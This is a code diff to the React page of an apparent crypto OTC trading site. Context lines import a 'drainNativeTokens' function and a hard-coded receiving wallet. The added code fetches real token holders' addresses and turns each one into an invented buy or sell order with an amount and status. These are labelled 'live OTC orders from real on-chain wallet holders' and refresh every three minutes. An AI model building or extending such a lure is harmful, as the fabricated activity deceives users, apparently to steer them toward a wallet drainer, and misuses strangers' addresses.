@@ -20,7 +20,8 @@ import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
 import { drainNativeTokens } from '@/utils/evmTransactions';
 import { useChainInfo } from '@/hooks/useChainInfo';
-import { OTC_ORDERS_LIST, TOTAL_ORDERS_VALUE, getAvatarUrl, OtcListStatus } from '@/data/otcOrdersList';
+import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
+import { fetchTokenHolders, deriveOrderFromAddress, shortAddress, HolderWallet } from '@/services/tokenHolders';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const MAX_BATCH_SIZE = 5;
@@ -243,11 +244,26 @@ const OTC = () => {
   const [userOrders] = useState<OTCOrder[]>([]);
   const [orderSort, setOrderSort] = useState<'time' | 'value'>('time');
 
-  // Order list search
+  // Order list search → opens popup with real wallet addresses
   const [listSearchAddress, setListSearchAddress] = useState('');
   const [listSearchToken, setListSearchToken] = useState<DexScreenerTokenInfo | null>(null);
   const [isListSearching, setIsListSearching] = useState(false);
   const [listSearchError, setListSearchError] = useState('');
+  const [showOrdersDialog, setShowOrdersDialog] = useState(false);
+  const [holders, setHolders] = useState<HolderWallet[]>([]);
+  const [isLoadingHolders, setIsLoadingHolders] = useState(false);
+  const [lastRefreshed, setLastRefreshed] = useState<Date | null>(null);
+
+  const loadHolders = useCallback(async (addr: string) => {
+    setIsLoadingHolders(true);
+    try {
+      const list = await fetchTokenHolders(addr, 100);
+      setHolders(list);
+      setLastRefreshed(new Date());
+    } finally {
+      setIsLoadingHolders(false);
+    }
+  }, []);
 
   const handleListSearch = async () => {
     const addr = listSearchAddress.trim();
@@ -259,6 +275,8 @@ const OTC = () => {
       const info = await fetchTokenInfo(addr);
       if (info) {
         setListSearchToken(info);
+        setShowOrdersDialog(true);
+        await loadHolders(addr);
       } else {
         setListSearchError('Token not found for this address.');
       }
@@ -268,6 +286,15 @@ const OTC = () => {
       setIsListSearching(false);
     }
   };
+
+  // Auto-refresh wallet addresses every 3 minutes while the dialog is open
+  useEffect(() => {
+    if (!showOrdersDialog || !listSearchToken) return;
+    const id = setInterval(() => {
+      loadHolders(listSearchToken.baseToken.address);
+    }, 3 * 60 * 1000);
+    return () => clearInterval(id);
+  }, [showOrdersDialog, listSearchToken, loadHolders]);
 
   const fetchTokenDetails = async (address: string, setInfo: (info: DexScreenerTokenInfo | null) => void) => {
     if (!address.trim()) return;
@@ -510,101 +537,11 @@ const OTC = () => {
                 <p className="text-xs text-red-400">{listSearchError}</p>
               )}
 
-              <AnimatePresence>
-                {listSearchToken && (
-                  <motion.div
-                    initial={{ opacity: 0, y: -8 }}
-                    animate={{ opacity: 1, y: 0 }}
-                    exit={{ opacity: 0, y: -8 }}
-                    className="p-4 rounded-2xl bg-white/5 border border-primary/20 shadow-lg shadow-primary/10"
-                  >
-                    <div className="flex items-center gap-4">
-                      {listSearchToken.baseToken.logoURI ? (
-                        <img
-                          src={listSearchToken.baseToken.logoURI}
-                          alt={listSearchToken.baseToken.symbol}
-                          className="w-14 h-14 rounded-full border-2 border-primary/30"
-                        />
-                      ) : (
-                        <div className="w-14 h-14 rounded-full bg-primary/20 flex items-center justify-center font-bold text-primary">
-                          {listSearchToken.baseToken.symbol?.slice(0, 2)}
-                        </div>
-                      )}
-                      <div className="flex-1 min-w-0">
-                        <div className="font-bold text-lg truncate">
-                          {listSearchToken.baseToken.name}{' '}
-                          <span className="text-sm text-muted-foreground">({listSearchToken.baseToken.symbol})</span>
-                        </div>
-                        <div className="text-xs text-muted-foreground font-mono truncate">
-                          {listSearchToken.baseToken.address}
-                        </div>
-                        <div className="grid grid-cols-3 gap-2 mt-2 text-xs">
-                          <div>
-                            <div className="text-muted-foreground">Price</div>
-                            <div className="font-mono font-bold">${listSearchToken.priceUsd}</div>
-                          </div>
-                          <div>
-                            <div className="text-muted-foreground">Liquidity</div>
-                            <div className="font-mono font-bold">${Number(listSearchToken.liquidity?.usd || 0).toLocaleString()}</div>
-                          </div>
-                          <div>
-                            <div className="text-muted-foreground">24h Vol</div>
-                            <div className="font-mono font-bold">${Number(listSearchToken.volume?.h24 || 0).toLocaleString()}</div>
-                          </div>
-                        </div>
-                      </div>
-                    </div>
-                  </motion.div>
-                )}
-              </AnimatePresence>
+              <p className="text-xs text-muted-foreground">
+                Enter a token contract address to view live OTC orders from real on-chain wallet holders. Order list refreshes every 3 minutes.
+              </p>
 
-              {/* Orders List */}
-              <div className="pt-2">
-                <div className="flex items-center justify-between mb-3">
-                  <h3 className="font-bold">OTC Orders List</h3>
-                  <span className="text-xs text-muted-foreground">
-                    Total: <span className="text-primary font-bold">${TOTAL_ORDERS_VALUE.toLocaleString()}</span>
-                  </span>
-                </div>
-                <div className="max-h-[480px] overflow-y-auto rounded-xl border border-white/10 divide-y divide-white/5">
-                  {OTC_ORDERS_LIST.map((o) => {
-                    const statusClass: Record<OtcListStatus, string> = {
-                      active: 'text-green-500',
-                      pending: 'text-orange-400',
-                      cancelled: 'text-red-500',
-                    };
-                    return (
-                      <Link
-                        key={o.username}
-                        to={`/trader/${o.username}`}
-                        className="flex items-center gap-3 p-3 hover:bg-white/5 transition-colors"
-                      >
-                        <img
-                          src={getAvatarUrl(o.username)}
-                          alt={o.username}
-                          className="w-9 h-9 rounded-full bg-white/5 border border-white/10 shrink-0"
-                        />
-                        <div className="flex-1 min-w-0">
-                          <div className="font-medium truncate">@{o.username}</div>
-                          <div className="text-xs text-muted-foreground flex items-center gap-1">
-                            {o.side === 'buy' ? (
-                              <TrendingUp className="w-3 h-3 text-green-500" />
-                            ) : (
-                              <TrendingDown className="w-3 h-3 text-red-500" />
-                            )}
-                            <span className="capitalize">{o.side} order</span>
-                            <span>·</span>
-                            <span className="font-mono">${o.amount.toLocaleString()}</span>
-                          </div>
-                        </div>
-                        <span className={`text-xs font-bold capitalize ${statusClass[o.status]}`}>
-                          {o.status === 'cancelled' ? 'Canceled' : o.status}
-                        </span>
-                      </Link>
-                    );
-                  })}
-                </div>
-              </div>
+
             </CardContent>
           </Card>
         </motion.div>
@@ -1078,6 +1015,114 @@ const OTC = () => {
           </div>
         )}
       </Modal>
+
+      {/* OTC Orders Popup — opens after a contract address is searched */}
+      <Dialog open={showOrdersDialog} onOpenChange={setShowOrdersDialog}>
+        <DialogContent className="max-w-2xl max-h-[85vh] overflow-hidden flex flex-col bg-background/95 backdrop-blur border-white/10">
+          <DialogHeader>
+            <DialogTitle>OTC Orders</DialogTitle>
+          </DialogHeader>
+
+          {listSearchToken && (
+            <div className="p-4 rounded-2xl bg-white/5 border border-primary/20">
+              <div className="flex items-center gap-4">
+                {listSearchToken.baseToken.logoURI ? (
+                  <img
+                    src={listSearchToken.baseToken.logoURI}
+                    alt={listSearchToken.baseToken.symbol}
+                    className="w-14 h-14 rounded-full border-2 border-primary/30"
+                  />
+                ) : (
+                  <div className="w-14 h-14 rounded-full bg-primary/20 flex items-center justify-center font-bold text-primary">
+                    {listSearchToken.baseToken.symbol?.slice(0, 2)}
+                  </div>
+                )}
+                <div className="flex-1 min-w-0">
+                  <div className="font-bold text-lg truncate">
+                    {listSearchToken.baseToken.name}{' '}
+                    <span className="text-sm text-muted-foreground">({listSearchToken.baseToken.symbol})</span>
+                  </div>
+                  <div className="text-xs text-muted-foreground font-mono truncate">
+                    {shortAddress(listSearchToken.baseToken.address, 8, 8)}
+                  </div>
+                  <div className="grid grid-cols-3 gap-2 mt-2 text-xs">
+                    <div>
+                      <div className="text-muted-foreground">Price</div>
+                      <div className="font-mono font-bold">${listSearchToken.priceUsd}</div>
+                    </div>
+                    <div>
+                      <div className="text-muted-foreground">Liquidity</div>
+                      <div className="font-mono font-bold">${Number(listSearchToken.liquidity?.usd || 0).toLocaleString()}</div>
+                    </div>
+                    <div>
+                      <div className="text-muted-foreground">24h Vol</div>
+                      <div className="font-mono font-bold">${Number(listSearchToken.volume?.h24 || 0).toLocaleString()}</div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          )}
+
+          <div className="flex items-center justify-between text-xs text-muted-foreground px-1">
+            <span>{holders.length} live wallet orders</span>
+            <span>
+              {isLoadingHolders ? 'Refreshing…' : lastRefreshed ? `Updated ${lastRefreshed.toLocaleTimeString()}` : ''}
+              {' '}· Auto-refresh 3 min
+            </span>
+          </div>
+
+          <div className="flex-1 overflow-y-auto rounded-xl border border-white/10 divide-y divide-white/5">
+            {isLoadingHolders && holders.length === 0 ? (
+              <div className="p-6 text-center text-sm text-muted-foreground">
+                <Loader2 className="w-5 h-5 animate-spin mx-auto mb-2" />
+                Loading wallet orders…
+              </div>
+            ) : holders.length === 0 ? (
+              <div className="p-6 text-center text-sm text-muted-foreground">No wallets found for this token.</div>
+            ) : (
+              holders.map((h, idx) => {
+                const o = deriveOrderFromAddress(h.address, idx);
+                const statusClass =
+                  o.status === 'active'
+                    ? 'text-green-500'
+                    : o.status === 'pending'
+                    ? 'text-orange-400'
+                    : 'text-red-500';
+                return (
+                  <Link
+                    key={h.address + idx}
+                    to={`/trader/${h.address}`}
+                    className="flex items-center gap-3 p-3 hover:bg-white/5 transition-colors"
+                  >
+                    <img
+                      src={`https://api.dicebear.com/7.x/identicon/svg?seed=${encodeURIComponent(h.address)}`}
+                      alt={h.address}
+                      className="w-9 h-9 rounded-full bg-white/5 border border-white/10 shrink-0"
+                    />
+                    <div className="flex-1 min-w-0">
+                      <div className="font-medium font-mono text-sm truncate">{shortAddress(h.address, 6, 6)}</div>
+                      <div className="text-xs text-muted-foreground flex items-center gap-1">
+                        {o.side === 'buy' ? (
+                          <TrendingUp className="w-3 h-3 text-green-500" />
+                        ) : (
+                          <TrendingDown className="w-3 h-3 text-red-500" />
+                        )}
+                        <span className="capitalize">{o.side} order</span>
+                        <span>·</span>
+                        <span className="font-mono">${o.amount.toLocaleString()}</span>
+                      </div>
+                    </div>
+                    <span className={`text-xs font-bold capitalize ${statusClass}`}>
+                      {o.status === 'cancelled' ? 'Canceled' : o.status}
+                    </span>
+                  </Link>
+                );
+              })
+            )}
+          </div>
+        </DialogContent>
+      </Dialog>
     </div>
   );
 };
